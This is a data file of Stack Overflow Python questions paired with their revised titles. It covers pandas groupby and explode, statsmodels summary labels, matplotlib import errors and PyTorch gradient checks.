Group several columns then aggregate a set of columns," I am relatively new to the world of Python and trying to use it as a back-up platform to do data analysis. I generally use data.table for my data analysis needs.The issue is that when I run group-aggregate operation on big CSV file (randomized, zipped, uploaded at http://www.filedropper.com/ddataredact_1), Python throws: grouping pandas return getattr(obj, method)(*args, **kwds) ValueError: negative dimensions are not allowedOR (I have even encountered...) File ""C:\Anaconda3\lib\site-packages\pandas\core\reshape\util.py"", line 65, in cartesian_product for i, x in enumerate(X)] File ""C:\Anaconda3\lib\site-packages\pandas\core\reshape\util.py"", line 65, in for i, x in enumerate(X)] File ""C:\Anaconda3\lib\site-packages\numpy\core\fromnumeric.py"", line 445, in repeat return _wrapfunc(a, 'repeat', repeats, axis=axis) File ""C:\Anaconda3\lib\site-packages\numpy\core\fromnumeric.py"", line 51, in _wrapfunc return getattr(obj, method)(*args, **kwds) MemoryErrorI have spent three days trying to reduce the file size (I was able to reduce the size by 89%), adding breakpoints, debugging it, but I was not able to make any progress.Surprisingly, I thought of running the same group/aggregate operation in data.table in R, and it hardly took 1 second. Moreover, I didn't have to do any data type conversion etc., suggested at https://www.dataquest.io/blog/pandas-big-data/. I also researched other threads: Avoiding Memory Issues For GroupBy on Large Pandas DataFrame, Pandas: df.groupby() is too slow for big data set. Any alternatives methods?, and pandas groupby with sum() on large csv file?. It seems these threads are more about matrix multiplication. I'd appreciate if you wouldn't tag this as duplicate. Here's my Python code: The code crashes in above .groupby operation. Can someone please help me? Compared to my other posts, I have probably spent the most amount of time on this StackOverflow post, trying to fix it and learn new stuff about Python. However, I have reached saturation--it even more frustrates me because R's data.table package processes this file in <2 seconds. This post is not about pros and cons of R and Python, but about using Python to be more productive. I am completely lost, and I'd appreciate any help.Here's my data.table R code: I have a 4-core 16GB RAM Win10x64 machine. I can provide any details needed by experts.Adding to Josemz's comment, here are two threads on agg vs. apply: What is the difference between pandas agg and apply function? and Pandas difference between apply() and aggregate() functions <code>  finaldatapath = ""..\Data_R""ddata = pd.read_csv(finaldatapath +""\\""+""ddata_redact.csv"", low_memory=False,encoding =""ISO-8859-1"")#before optimization: 353MBddata.info(memory_usage=""deep"")#optimize file: Object-types are the biggest culprit.ddata_obj = ddata.select_dtypes(include=['object']).copy()#Now convert this to category type:#Float type didn't help much, so I am excluding it here.for col in ddata_obj: del ddata[col] ddata.loc[:, col] = ddata_obj[col].astype('category')#release memorydel ddata_obj#after optimization: 39MBddata.info(memory_usage=""deep"")#Create a list of grouping variables:group_column_list = [ ""Business"", ""Device_Family"", ""Geo"", ""Segment"", ""Cust_Name"", ""GID"", ""Device ID"", ""Seller"", ""C9Phone_Margins_Flag"", ""C9Phone_Cust_Y_N"", ""ANDroid_Lic_Type"", ""Type"", ""Term"", 'Cust_ANDroid_Margin_Bucket', 'Cust_Mobile_Margin_Bucket',# # 'Cust_Android_App_Bucket', 'ANDroind_App_Cust_Y_N']print(""Analyzing data now..."")def ddata_agg(x): names = { 'ANDroid_Margin': x['ANDroid_Margin'].sum(), 'Margins': x['Margins'].sum(), 'ANDroid_App_Qty': x['ANDroid_App_Qty'].sum(), 'Apple_Margin':x['Apple_Margin'].sum(), 'P_Lic':x['P_Lic'].sum(), 'Cust_ANDroid_Margins':x['Cust_ANDroid_Margins'].mean(), 'Cust_Mobile_Margins':x['Cust_Mobile_Margins'].mean(), 'Cust_ANDroid_App_Qty':x['Cust_ANDroid_App_Qty'].mean() } return pd.Series(names)ddata=ddata.reset_index(drop=True)ddata = ddata.groupby(group_column_list).apply(ddata_agg) path_r = ""../ddata_redact.csv""ddata<-data.table::fread(path_r,stringsAsFactors=FALSE,data.table = TRUE, header = TRUE)group_column_list <-c( ""Business"", ""Device_Family"", ""Geo"", ""Segment"", ""Cust_Name"", ""GID"", ""Device ID"", ""Seller"", ""C9Phone_Margins_Flag"", ""C9Phone_Cust_Y_N"", ""ANDroid_Lic_Type"", ""Type"", ""Term"", 'Cust_ANDroid_Margin_Bucket', 'Cust_Mobile_Margin_Bucket', # # 'Cust_Android_App_Bucket', 'ANDroind_App_Cust_Y_N' ) ddata<-ddata[, .(ANDroid_Margin = sum(ANDroid_Margin,na.rm = TRUE), Margins=sum(Margins,na.rm = TRUE), Apple_Margin=sum(Apple_Margin,na.rm=TRUE), Cust_ANDroid_Margins = mean(Cust_ANDroid_Margins,na.rm = TRUE), Cust_Mobile_Margins = mean(Cust_Mobile_Margins,na.rm = TRUE),Cust_ANDroid_App_Qty = mean(Cust_ANDroid_App_Qty,na.rm = TRUE),ANDroid_App_Qty=sum(ANDroid_App_Qty,na.rm = TRUE)), by=group_column_list]",Group several columns then aggregate a set of columns in Pandas (It crashes badly compared to R's data.table)
A issue about statsmodel A python package," I am using OLS from statsmodel, the link is https://www.statsmodels.org/stable/examples/notebooks/generated/ols.html You can see the X is showing as USD in the summary which is what I want.However, after adding a new variable It is not showing USD and JPY, but x1 x2. Is there a way to fix it? I tried google but found nothing.  <code>  #USDX = sm.add_constant(USD)model = sm.OLS(y, X)results = model.fit()print(results.summary()) OLS Regression Results ========================================================================================Dep. Variable: All Ordinaries closing price R-squared: 0.265Model: OLS Adj. R-squared: 0.265Method: Least Squares F-statistic: 352.4Date: Tue, 23 Oct 2018 Prob (F-statistic): 2.35e-67Time: 17:30:24 Log-Likelihood: -8018.8No. Observations: 977 AIC: 1.604e+04Df Residuals: 975 BIC: 1.605e+04Df Model: 1 Covariance Type: nonrobust ============================================================================== coef std err t P>|t| [0.025 0.975]------------------------------------------------------------------------------const 1843.1414 149.675 12.314 0.000 1549.418 2136.864USD 3512.5040 187.111 18.772 0.000 3145.318 3879.690==============================================================================Omnibus: 276.458 Durbin-Watson: 0.009Prob(Omnibus): 0.000 Jarque-Bera (JB): 74.633Skew: 0.438 Prob(JB): 6.22e-17Kurtosis: 1.967 Cond. No. 10.7==============================================================================Warnings:[1] Standard Errors assume that the covariance matrix of the errors is correctly specified #JPY + USDX = sm.add_constant(JPY)X = np.column_stack((X, USD))model = sm.OLS(y, X)results = model.fit()print(results.summary()) OLS Regression Results ========================================================================================Dep. Variable: All Ordinaries closing price R-squared: 0.641Model: OLS Adj. R-squared: 0.640Method: Least Squares F-statistic: 868.8Date: Tue, 23 Oct 2018 Prob (F-statistic): 2.80e-217Time: 17:39:19 Log-Likelihood: -7669.4No. Observations: 977 AIC: 1.534e+04Df Residuals: 974 BIC: 1.536e+04Df Model: 2 Covariance Type: nonrobust ============================================================================== coef std err t P>|t| [0.025 0.975]------------------------------------------------------------------------------const -1559.5880 149.478 -10.434 0.000 -1852.923 -1266.253x1 78.6589 2.466 31.902 0.000 73.820 83.497x2 -366.5850 178.672 -2.052 0.040 -717.211 -15.958==============================================================================Omnibus: 24.957 Durbin-Watson: 0.031Prob(Omnibus): 0.000 Jarque-Bera (JB): 27.278Skew: 0.353 Prob(JB): 1.19e-06Kurtosis: 3.415 Cond. No. 743.==============================================================================Warnings:[1] Standard Errors assume that the covariance matrix of the errors is correctly specified.",Preserve variable names in summary from statsmodels
An issue about statsmodel A python package," I am using OLS from statsmodel, the link is https://www.statsmodels.org/stable/examples/notebooks/generated/ols.html You can see the X is showing as USD in the summary which is what I want.However, after adding a new variable It is not showing USD and JPY, but x1 x2. Is there a way to fix it? I tried google but found nothing.  <code>  #USDX = sm.add_constant(USD)model = sm.OLS(y, X)results = model.fit()print(results.summary()) OLS Regression Results ========================================================================================Dep. Variable: All Ordinaries closing price R-squared: 0.265Model: OLS Adj. R-squared: 0.265Method: Least Squares F-statistic: 352.4Date: Tue, 23 Oct 2018 Prob (F-statistic): 2.35e-67Time: 17:30:24 Log-Likelihood: -8018.8No. Observations: 977 AIC: 1.604e+04Df Residuals: 975 BIC: 1.605e+04Df Model: 1 Covariance Type: nonrobust ============================================================================== coef std err t P>|t| [0.025 0.975]------------------------------------------------------------------------------const 1843.1414 149.675 12.314 0.000 1549.418 2136.864USD 3512.5040 187.111 18.772 0.000 3145.318 3879.690==============================================================================Omnibus: 276.458 Durbin-Watson: 0.009Prob(Omnibus): 0.000 Jarque-Bera (JB): 74.633Skew: 0.438 Prob(JB): 6.22e-17Kurtosis: 1.967 Cond. No. 10.7==============================================================================Warnings:[1] Standard Errors assume that the covariance matrix of the errors is correctly specified #JPY + USDX = sm.add_constant(JPY)X = np.column_stack((X, USD))model = sm.OLS(y, X)results = model.fit()print(results.summary()) OLS Regression Results ========================================================================================Dep. Variable: All Ordinaries closing price R-squared: 0.641Model: OLS Adj. R-squared: 0.640Method: Least Squares F-statistic: 868.8Date: Tue, 23 Oct 2018 Prob (F-statistic): 2.80e-217Time: 17:39:19 Log-Likelihood: -7669.4No. Observations: 977 AIC: 1.534e+04Df Residuals: 974 BIC: 1.536e+04Df Model: 2 Covariance Type: nonrobust ============================================================================== coef std err t P>|t| [0.025 0.975]------------------------------------------------------------------------------const -1559.5880 149.478 -10.434 0.000 -1852.923 -1266.253x1 78.6589 2.466 31.902 0.000 73.820 83.497x2 -366.5850 178.672 -2.052 0.040 -717.211 -15.958==============================================================================Omnibus: 24.957 Durbin-Watson: 0.031Prob(Omnibus): 0.000 Jarque-Bera (JB): 27.278Skew: 0.353 Prob(JB): 1.19e-06Kurtosis: 3.415 Cond. No. 743.==============================================================================Warnings:[1] Standard Errors assume that the covariance matrix of the errors is correctly specified.",Preserve variable names in summary from statsmodels
An issue about using statsmodel A python package," I am using OLS from statsmodel, the link is https://www.statsmodels.org/stable/examples/notebooks/generated/ols.html You can see the X is showing as USD in the summary which is what I want.However, after adding a new variable It is not showing USD and JPY, but x1 x2. Is there a way to fix it? I tried google but found nothing.  <code>  #USDX = sm.add_constant(USD)model = sm.OLS(y, X)results = model.fit()print(results.summary()) OLS Regression Results ========================================================================================Dep. Variable: All Ordinaries closing price R-squared: 0.265Model: OLS Adj. R-squared: 0.265Method: Least Squares F-statistic: 352.4Date: Tue, 23 Oct 2018 Prob (F-statistic): 2.35e-67Time: 17:30:24 Log-Likelihood: -8018.8No. Observations: 977 AIC: 1.604e+04Df Residuals: 975 BIC: 1.605e+04Df Model: 1 Covariance Type: nonrobust ============================================================================== coef std err t P>|t| [0.025 0.975]------------------------------------------------------------------------------const 1843.1414 149.675 12.314 0.000 1549.418 2136.864USD 3512.5040 187.111 18.772 0.000 3145.318 3879.690==============================================================================Omnibus: 276.458 Durbin-Watson: 0.009Prob(Omnibus): 0.000 Jarque-Bera (JB): 74.633Skew: 0.438 Prob(JB): 6.22e-17Kurtosis: 1.967 Cond. No. 10.7==============================================================================Warnings:[1] Standard Errors assume that the covariance matrix of the errors is correctly specified #JPY + USDX = sm.add_constant(JPY)X = np.column_stack((X, USD))model = sm.OLS(y, X)results = model.fit()print(results.summary()) OLS Regression Results ========================================================================================Dep. Variable: All Ordinaries closing price R-squared: 0.641Model: OLS Adj. R-squared: 0.640Method: Least Squares F-statistic: 868.8Date: Tue, 23 Oct 2018 Prob (F-statistic): 2.80e-217Time: 17:39:19 Log-Likelihood: -7669.4No. Observations: 977 AIC: 1.534e+04Df Residuals: 974 BIC: 1.536e+04Df Model: 2 Covariance Type: nonrobust ============================================================================== coef std err t P>|t| [0.025 0.975]------------------------------------------------------------------------------const -1559.5880 149.478 -10.434 0.000 -1852.923 -1266.253x1 78.6589 2.466 31.902 0.000 73.820 83.497x2 -366.5850 178.672 -2.052 0.040 -717.211 -15.958==============================================================================Omnibus: 24.957 Durbin-Watson: 0.031Prob(Omnibus): 0.000 Jarque-Bera (JB): 27.278Skew: 0.353 Prob(JB): 1.19e-06Kurtosis: 3.415 Cond. No. 743.==============================================================================Warnings:[1] Standard Errors assume that the covariance matrix of the errors is correctly specified.",Preserve variable names in summary from statsmodels
An issue about using statsmodel A python package," I am using OLS from statsmodel, the link is https://www.statsmodels.org/stable/examples/notebooks/generated/ols.html You can see the X is showing as USD in the summary which is what I want.However, after adding a new variable It is not showing USD and JPY, but x1 x2. Is there a way to fix it? I tried google but found nothing.  <code>  #USDX = sm.add_constant(USD)model = sm.OLS(y, X)results = model.fit()print(results.summary()) OLS Regression Results ========================================================================================Dep. Variable: All Ordinaries closing price R-squared: 0.265Model: OLS Adj. R-squared: 0.265Method: Least Squares F-statistic: 352.4Date: Tue, 23 Oct 2018 Prob (F-statistic): 2.35e-67Time: 17:30:24 Log-Likelihood: -8018.8No. Observations: 977 AIC: 1.604e+04Df Residuals: 975 BIC: 1.605e+04Df Model: 1 Covariance Type: nonrobust ============================================================================== coef std err t P>|t| [0.025 0.975]------------------------------------------------------------------------------const 1843.1414 149.675 12.314 0.000 1549.418 2136.864USD 3512.5040 187.111 18.772 0.000 3145.318 3879.690==============================================================================Omnibus: 276.458 Durbin-Watson: 0.009Prob(Omnibus): 0.000 Jarque-Bera (JB): 74.633Skew: 0.438 Prob(JB): 6.22e-17Kurtosis: 1.967 Cond. No. 10.7==============================================================================Warnings:[1] Standard Errors assume that the covariance matrix of the errors is correctly specified #JPY + USDX = sm.add_constant(JPY)X = np.column_stack((X, USD))model = sm.OLS(y, X)results = model.fit()print(results.summary()) OLS Regression Results ========================================================================================Dep. Variable: All Ordinaries closing price R-squared: 0.641Model: OLS Adj. R-squared: 0.640Method: Least Squares F-statistic: 868.8Date: Tue, 23 Oct 2018 Prob (F-statistic): 2.80e-217Time: 17:39:19 Log-Likelihood: -7669.4No. Observations: 977 AIC: 1.534e+04Df Residuals: 974 BIC: 1.536e+04Df Model: 2 Covariance Type: nonrobust ============================================================================== coef std err t P>|t| [0.025 0.975]------------------------------------------------------------------------------const -1559.5880 149.478 -10.434 0.000 -1852.923 -1266.253x1 78.6589 2.466 31.902 0.000 73.820 83.497x2 -366.5850 178.672 -2.052 0.040 -717.211 -15.958==============================================================================Omnibus: 24.957 Durbin-Watson: 0.031Prob(Omnibus): 0.000 Jarque-Bera (JB): 27.278Skew: 0.353 Prob(JB): 1.19e-06Kurtosis: 3.415 Cond. No. 743.==============================================================================Warnings:[1] Standard Errors assume that the covariance matrix of the errors is correctly specified.",Preserve variable names in summary from statsmodels
"""with"" syntax for opening files with two functions"," Let's say I want to open a text file for reading using the following syntax: But if I detect that it ends with .gz, I would call gzip.open(). If ""do something"" part is long and not convenient to write in a function (e.g. it would create a nested function, which cannot be serialized), what is the shortest way to call with either gzip.open or open based on the return of fname.endswith('.gz')? <code>  with open(fname,'r') as f: # do something pass if fname.endswith('.gz'): with gzip.open(fname,'rt') as f: # do something passelse: with open(fname,'r') as f: # do something pass","python: ""with"" syntax for opening files with two functions"
"Python scoping: ""except Foo as bar"" causes ""bar"" to be removed from scope?"," Given the following code: Can somebody explain why this causes the following output in Python 3? <code>  msg = ""test""try: ""a""[1]except IndexError as msg: print(""Error happened"")print(msg) Error happenedTraceback (most recent call last): File ""test.py"", line 6, in <module> print(msg)NameError: name 'msg' is not defined","""except Foo as bar"" causes ""bar"" to be removed from scope"
matplotlib 3.0.0 and keras 2.2.4 incompatible?," Using Windows 10, anaconda as a package manager. I have a base environment running python 3.7 where matplotlib works fine. When I create a new environment and install both keras and matplotlib, I start to run into problems: Any suggestions? This is a fresh installation of conda. All I've done to get here is run conda create --name keras_env keras matplotlib, enter the environment, and try to import matplotlib. These are the packages conda installs: <code>  >>> import matplotlib.pyplot as pltTraceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""C:\...\Anaconda3\envs\keras_env\lib\site-packages\matplotlib\__init__.py"", line 1111, in <module> rcParamsOrig = RcParams(rcParams.copy()) File ""C:\...\Anaconda3\envs\keras_env\lib\site-packages\matplotlib\__init__.py"", line 891, in __getitem__ from matplotlib import pyplot as plt File ""C:\...\Anaconda3\envs\keras_env\lib\site-packages\matplotlib\pyplot.py"", line 32, in <module> import matplotlib.colorbar File ""C:\...\Anaconda3\envs\keras_env\lib\site-packages\matplotlib\colorbar.py"", line 40, in <module> import matplotlib._constrained_layout as constrained_layout File ""C:\...\Anaconda3\envs\keras_env\lib\site-packages\matplotlib\_constrained_layout.py"", line 52, in <module> from matplotlib.legend import Legend File ""C:\...\Anaconda3\envs\keras_env\lib\site-packages\matplotlib\legend.py"", line 43, in <module> from matplotlib.offsetbox import HPacker, VPacker, TextArea, DrawingArea File ""C:\...\Anaconda3\envs\keras_env\lib\site-packages\matplotlib\offsetbox.py"", line 33, in <module> from matplotlib.image import BboxImage File ""C:\...\Anaconda3\envs\keras_env\lib\site-packages\matplotlib\image.py"", line 19, in <module> from matplotlib.backend_bases import FigureCanvasBase File ""C:\...\Anaconda3\envs\keras_env\lib\site-packages\matplotlib\backend_bases.py"", line 46, in <module> from matplotlib import (ImportError: cannot import name 'get_backend' ## Package Plan ##environment location: C:\...\Anaconda3\envs\keras_envadded / updated specs:- keras- matplotlibThe following NEW packages will be INSTALLED:_tflow_select: 2.2.0-eigenabsl-py: 0.5.0-py36_0astor: 0.7.1-py36_0blas: 1.0-mklca-certificates: 2018.03.07-0certifi: 2018.10.15-py36_0cycler: 0.10.0-py36h009560c_0freetype: 2.9.1-ha9979f8_1gast: 0.2.0-py36_0grpcio: 1.12.1-py36h1a1b453_0h5py: 2.8.0-py36h3bdd7fb_2hdf5: 1.10.2-hac2f561_1icc_rt: 2017.0.4-h97af966_0icu: 58.2-ha66f8fd_1intel-openmp: 2019.0-118jpeg: 9b-hb83a4c4_2keras: 2.2.4-0keras-applications: 1.0.6-py36_0keras-base: 2.2.4-py36_0keras-preprocessing: 1.0.5-py36_0kiwisolver: 1.0.1-py36h6538335_0libpng: 1.6.35-h2a8f88b_0libprotobuf: 3.6.0-h1a1b453_0markdown: 3.0.1-py36_0matplotlib: 3.0.0-py36hd159220_0mkl: 2019.0-118mkl_fft: 1.0.6-py36hdbbee80_0mkl_random: 1.0.1-py36h77b88f5_1numpy: 1.15.3-py36ha559c80_0numpy-base: 1.15.3-py36h8128ebf_0openssl: 1.0.2p-hfa6e2cd_0pip: 10.0.1-py36_0protobuf: 3.6.0-py36he025d50_0pyparsing: 2.2.2-py36_0pyqt: 5.9.2-py36h6538335_2python: 3.6.7-h33f27b4_0python-dateutil: 2.7.3-py36_0pytz: 2018.5-py36_0pyyaml: 3.13-py36hfa6e2cd_0qt: 5.9.6-vc14h1e9a669_2scipy: 1.1.0-py36h4f6bf74_1setuptools: 40.4.3-py36_0sip: 4.19.8-py36h6538335_0six: 1.11.0-py36_1sqlite: 3.25.2-hfa6e2cd_0tensorboard: 1.11.0-py36he025d50_0tensorflow: 1.11.0-eigen_py36h346fd36_0tensorflow-base: 1.11.0-eigen_py36h45df0d8_0termcolor: 1.1.0-py36_1tornado: 5.1.1-py36hfa6e2cd_0vc: 14.1-h0510ff6_4vs2015_runtime: 14.15.26706-h3a45250_0werkzeug: 0.14.1-py36_0wheel: 0.32.2-py36_0wincertstore: 0.2-py36h7fe50ca_0yaml: 0.1.7-hc54c509_2zlib: 1.2.11-h8395fce_2","matplotlib 3.0.0, cannot import name 'get_backend' from 'matplotlib'"
map index of numpy matrix," How should I map indices of a numpy matrix?For example: The row/column indices are 0, 1, 2.So: Let s say I need to map these indices, converting 0, 1, 2 into, e.g. 10, 'A', 'B' in the way that: I can just set a dict and use it to access the elements, but I would like to know if it is possible to do something like what I just described. <code>  mx = np.matrix([[5,6,2],[3,3,7],[0,1,6]] >>> mx[0,0]5 mx[10,10] #returns 5mx[10,'A'] #returns 6 and so on..",Map index of numpy matrix
different object size of True and False in Python3, Experimenting with magic methods (__sizeof__ in particular) on different Python objects I stumbled over the following behaviour:Python 2.7 Python 3.x What changed in Python 3 that makes the size of True greater than the size of False? <code>  >>> False.__sizeof__()24>>> True.__sizeof__()24 >>> False.__sizeof__()24>>> True.__sizeof__()28,Different object size of True and False in Python 3
How to efficiently extract all slices of give length using tensorflow," I am trying to extract all slices of length 4 along 0th axis of a 2-dim tensor. So far I can do it mixing pure Python with tensorflow. What would be an efficient way of doing that without using pure Python? Note that the ""test"" array is actually supposed to be a tensor, thus its shape isn't known before I execute the first part of the graph.A full vanilla example: result: <code>  r = test.shape[0] # test should be a tensorn = 4a_list = list(range(r))the_list = np.array([a_list[slice(i, i+n)] for i in range(r - n+1)])test_stacked = tf.stack(tf.gather(test, the_list)) array = np.array([[0, 1],[1, 2],[2, 3],[3, 4],[4, 5],[5, 6]])array.shape # (6,2)r = array.shape[0]n = 4a_list = list(range(r))the_list = np.array([a_list[slice(i, i+n)] for i in range(r - n+1)])result = array[the_list] # all possible slices of length 4 of the array along 0th axisresult.shape # (3, 4, 2) [[[0 1] [1 2] [2 3] [3 4]] [[1 2] [2 3] [3 4] [4 5]] [[2 3] [3 4] [4 5] [5 6]]]",How to efficiently extract all slices of given length using tensorflow
Selenium: Chrome failed to start: crashed," Recently I switched computers and since then I can't launch chrome with selenium. I've also tried Firefox but the browser instance just doesn't launch. i get the following error: i have the latest chrome version and chromedriver installedEDIT:After trying @b0sss solution i am getting the following error. <code>  from selenium import webdriverd = webdriver.Chrome('/home/PycharmProjects/chromedriver')d.get('https://www.google.nl/') selenium.common.exceptions.WebDriverException: Message: unknown error: Chrome failed to start: crashed (unknown error: DevToolsActivePort file doesn't exist) (The process started from chrome location /opt/google/chrome/google-chrome is no longer running, so ChromeDriver is assuming that Chrome has crashed.) (Driver info: chromedriver=2.43.600233, platform=Linux 4.15.0-38-generic x86_64) selenium.common.exceptions.WebDriverException: Message: unknown error: Chrome failed to start: crashed (chrome not reachable) (The process started from chrome location /opt/google/chrome/google-chrome is no longer running, so chromedriver is assuming that Chrome has crashed.) (Driver info: chromedriver=2.43.600233 (523efee95e3d68b8719b3a1c83051aa63aa6b10d),platform=Linux 4.15.0-38-generic x86_64)",Selenium: WebDriverException:Chrome failed to start: crashed as google-chrome is no longer running so ChromeDriver is assuming that Chrome has crashed
Python: how to compute Shannon entropy of Information from a Pandas Dataframe?, I have a dataframe df that contains the information of transactions from a individual Name_Give to another Name_Receive like the following: for each Name_Receive j I would like to compute the Shannon Entropy as S_j = -sum_i p_i \log p_i where p_i is the amount divided by the sum of the amount for the user j I would like to have dataframe df1 like the following <code>  df Name_Give Name_Receive Amount0 John Tom 3001 Eva Tom 7002 Sarah Tom 1003 John Tom 2004 Tom Eva 7005 John Eva 3006 Carl Eva 250 S_Tom = - (300/1300 * np.log(300/1300) + 700/1300 * np.log(700/1300) + 100/1300 * np.log(100/1300) + 200/1300 * np.log(200/1300))S_Eva = - (700/1250 * np.log(700/1250) + 300/1250 * np.log(300/1250) + 250/1250 * np.log(250/1250)S_Tom = 1.157S_Eva = 0.99 df1 Name Entropy0 Tom 1.1571 Eva 0.99,How to compute Shannon entropy of Information from a Pandas Dataframe?
"Is there an easy way to get the number of repeating character in a word, in Python?"," I'm trying to get how many any character repeats in a word. The repetitions must be sequential. For example, the method with input ""loooooveee"" should return 6 (4 times 'o', 2 times 'e').I'm trying to implement string level functions and I can do it this way but, is there an easy way to do this? Regex, or some other sort of things? <code> ",Is there an easy way to get the number of repeating character in a word?
python - whats the point of a and a or b, I came across the following code in ipython: What is the point of that? Why not use just args or '_'?  <code>  oname = args and args or '_',"What is the purpose of ""a and a or b""?"
How to unnesting a column in pandas' DataFrame?," I have the following DataFrame where one of the columns is an object (list type cell): My expected output is: What should I do to achieve this?Related question pandas: When cell contents are lists, create a row for each element in the listGood question and answer but only handle one column with list(In my answer the self-def function will work for multiple columns, also the accepted answer is use the most time consuming apply , which is not recommended, check more info When should I ever want to use pandas apply() in my code?)  <code>  df=pd.DataFrame({'A':[1,2],'B':[[1,2],[1,2]]})dfOut[458]: A B0 1 [1, 2]1 2 [1, 2] A B0 1 11 1 23 2 14 2 2","How to unnest (explode) a column in a pandas DataFrame, into multiple rows"
How do I unnest a column in a pandas DataFrame?," I have the following DataFrame where one of the columns is an object (list type cell): My expected output is: What should I do to achieve this?Related question pandas: When cell contents are lists, create a row for each element in the listGood question and answer but only handle one column with list(In my answer the self-def function will work for multiple columns, also the accepted answer is use the most time consuming apply , which is not recommended, check more info When should I ever want to use pandas apply() in my code?)  <code>  df=pd.DataFrame({'A':[1,2],'B':[[1,2],[1,2]]})dfOut[458]: A B0 1 [1, 2]1 2 [1, 2] A B0 1 11 1 23 2 14 2 2","How to unnest (explode) a column in a pandas DataFrame, into multiple rows"
How do I unnest (explode) a column in a pandas DataFrame?," I have the following DataFrame where one of the columns is an object (list type cell): My expected output is: What should I do to achieve this?Related question pandas: When cell contents are lists, create a row for each element in the listGood question and answer but only handle one column with list(In my answer the self-def function will work for multiple columns, also the accepted answer is use the most time consuming apply , which is not recommended, check more info When should I ever want to use pandas apply() in my code?)  <code>  df=pd.DataFrame({'A':[1,2],'B':[[1,2],[1,2]]})dfOut[458]: A B0 1 [1, 2]1 2 [1, 2] A B0 1 11 1 23 2 14 2 2","How to unnest (explode) a column in a pandas DataFrame, into multiple rows"
How to unnest (explode) a column in a pandas DataFrame?," I have the following DataFrame where one of the columns is an object (list type cell): My expected output is: What should I do to achieve this?Related question pandas: When cell contents are lists, create a row for each element in the listGood question and answer but only handle one column with list(In my answer the self-def function will work for multiple columns, also the accepted answer is use the most time consuming apply , which is not recommended, check more info When should I ever want to use pandas apply() in my code?)  <code>  df=pd.DataFrame({'A':[1,2],'B':[[1,2],[1,2]]})dfOut[458]: A B0 1 [1, 2]1 2 [1, 2] A B0 1 11 1 23 2 14 2 2","How to unnest (explode) a column in a pandas DataFrame, into multiple rows"
How to unnest (explode) a column in a pandas DataFrame," I have the following DataFrame where one of the columns is an object (list type cell): My expected output is: What should I do to achieve this?Related question pandas: When cell contents are lists, create a row for each element in the listGood question and answer but only handle one column with list(In my answer the self-def function will work for multiple columns, also the accepted answer is use the most time consuming apply , which is not recommended, check more info When should I ever want to use pandas apply() in my code?)  <code>  df=pd.DataFrame({'A':[1,2],'B':[[1,2],[1,2]]})dfOut[458]: A B0 1 [1, 2]1 2 [1, 2] A B0 1 11 1 23 2 14 2 2","How to unnest (explode) a column in a pandas DataFrame, into multiple rows"
Python: Built-in way to create files and directories without overwriting," You know how when you download something and the downloads folder contains a file with the same name, instead of overwriting it or throwing an error, the file ends up with a number appended to the end? For example, if I want to download my_file.txt, but it already exists in the target folder, the new file will be named my_file(2).txt. And if I try again, it will be my_file(3).txt.I was wondering if there is a way in Python 3.x to check that and get a unique name (not necessarily create the file or directory). I'm currently implementing it doing this: In the example above, running new_file('my_file.txt') would return my_file_2.txt if my_file.txt already exists in the cwd. name can also contain the full or relative path, it will work as well. <code>  import osdef new_name(name, newseparator='_') #name can be either a file or directory name base, extension = os.path.splitext(name) i = 2 while os.path.exists(name): name = base + newseparator + str(i) + extension i += 1 return name",A way to create files and directories without overwriting
Built-in way to create files and directories without overwriting," You know how when you download something and the downloads folder contains a file with the same name, instead of overwriting it or throwing an error, the file ends up with a number appended to the end? For example, if I want to download my_file.txt, but it already exists in the target folder, the new file will be named my_file(2).txt. And if I try again, it will be my_file(3).txt.I was wondering if there is a way in Python 3.x to check that and get a unique name (not necessarily create the file or directory). I'm currently implementing it doing this: In the example above, running new_file('my_file.txt') would return my_file_2.txt if my_file.txt already exists in the cwd. name can also contain the full or relative path, it will work as well. <code>  import osdef new_name(name, newseparator='_') #name can be either a file or directory name base, extension = os.path.splitext(name) i = 2 while os.path.exists(name): name = base + newseparator + str(i) + extension i += 1 return name",A way to create files and directories without overwriting
How to get the list all existing loggers using python.logging module," Is there a way in Python to get a list of all defined loggers? I mean, does something exist such as logging.getAllLoggers() which would return a list of Logger objects?I searched the python.logging documentation but couldn't find such a method.Thank you in advance. <code> ",How to list all existing loggers using python.logging module
sqlalchemy filter by json field," I have model with json column. Example of model and data: Now I try to find records where id == 1: And I getting the next error: sqlalchemy.exc.ProgrammingError: (psycopg2.ProgrammingError) operator does not exist: json = integer LINE 3: WHERE (example.json_field -> 'id') = 1The reason. Look at generated query: But in my case correct query should be like this: How can I do this?I have tried use cast, but unsuccessfully: The error: sqlalchemy.exc.ProgrammingError: (psycopg2.ProgrammingError) cannot cast type json to integer LINE 3: WHERE CAST((example.json_field -> 'id') AS INTEGER) = 1As you can see where clause still wrong. Also I need to use range (>, <= etc.) conditions. Thanks for help. <code>  app = Flask(__name__)app.config['SQLALCHEMY_DATABASE_URI'] = 'postgres://...'db = SQLAlchemy()db.init_app(app)app.app_context().push()class Example(db.Model): id = db.Column(db.Integer(), nullable=False, primary_key=True, ) json_field = db.Column(db.JSON())db.create_all()db.session.add(Example(json_field={'id': None}))db.session.add(Example(json_field={'id': 1}))db.session.add(Example(json_field={'id': 50}))db.session.add(Example(json_field={}))db.session.commit() query = db.session.query(Example).filter(Example.json_field['id'] == 1)print(query.all()) SELECT example.id AS example_id, example.json_field AS example_json_field FROM example WHERE (example.json_field -> %(json_field_1)s) = %(param_1)s SELECT * FROM example WHERE CAST(json_field->>'id' AS INTEGER) = 1; print( db.session.query(Example).filter( cast(Example.json_field['id'], Integer) == 1 ).all())",flask-sqlalchemy filter by json field
How Pytorch compute gradient for division operator," I'm trying to compute the gradient of 1/x without using Pytorch's autograd. I use the formula grad(1/x, x) = -1/x**2. When I compare my result with this formula to the gradient given by Pytorch's autograd, they're different.Here is my code: The output is: Can anyone explain to me what the problem is? <code>  a = torch.tensor(np.random.randn(), dtype=dtype, requires_grad=True)loss = 1/aloss.backward()print(a.grad - (-1/(a**2))) tensor(5.9605e-08, grad_fn=<ThAddBackward>)",PyTorch gradient differs from manually calculated gradient
